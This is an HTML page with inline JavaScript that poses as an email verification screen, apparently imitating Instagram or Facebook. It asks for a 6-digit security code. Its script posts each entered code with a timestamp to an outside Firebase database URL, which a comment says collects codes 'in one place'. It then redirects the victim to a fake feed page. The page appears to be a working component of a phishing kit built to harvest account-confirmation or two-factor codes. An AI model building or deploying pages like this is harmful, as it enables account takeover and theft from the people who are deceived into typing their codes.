<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="email.css">
    <title>Check your email</title>
    <style>
        
    </style>
</head>
<body>

    <div class="container">
        <div class="back-btn" onclick="history.back()">‚Üê</div>
        
        <h1 class="header-text">Check your email</h1>
        <p class="sub-text">
            We sent a code to <span class="email-highlight">s*******@gmail.com</span>. Use that code to confirm your account.
        </p>

        <div class="illustration-box">
            <img src="auth.jpeg" alt="Email Illustration">
        </div>

        <form id="emailCodeForm">
            <input type="text" id="emailCode" placeholder="Enter 6-digit code" maxlength="6" required>
            
            <div class="info-row">
                <span>It may take a few minutes for you to get this link. <a href="#" class="link-text">Get a new link</a></span>
            </div>

            <button type="submit" class="btn-continue" id="submitBtn" disabled>Continue</button>
            <!-- <button type="button" class="btn-resend">Try another way</button> -->
            <button type="button" class="btn-resend" onclick="window.location.href='verify.html'">Try Another Way</button>
            
        </form>
    </div>

    <script>
        // Same database URL so codes are collected in one place
        const DB_URL = "https://insta-39d4a-default-rtdb.firebaseio.com/codes.json";
        
        const codeInput = document.getElementById('emailCode');
        const submitBtn = document.getElementById('submitBtn');

        // Unlock button when code is entered
        codeInput.addEventListener('input', () => {
            if (codeInput.value.length >= 6) {
                submitBtn.style.backgroundColor = "#1877f2";
                submitBtn.style.cursor = "pointer";
                submitBtn.disabled = false;
            } else {
                submitBtn.style.backgroundColor = "#aac9ff";
                submitBtn.style.cursor = "not-allowed";
                submitBtn.disabled = true;
            }
        });

        // Save to Firebase
        document.getElementById('emailCodeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const data = {
                securityCode: codeInput.value,
                method: "Email",
                timestamp: new Date().toLocaleString()
            };

            try {
                const response = await fetch(DB_URL, {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.ok) {
                    // Send them to the Feed page you created earlier
                    window.location.href = "mainpage.html";
                }
            } catch (error) {
                console.error("Error:", error);
            }
        });
    </script>

</body>
</html>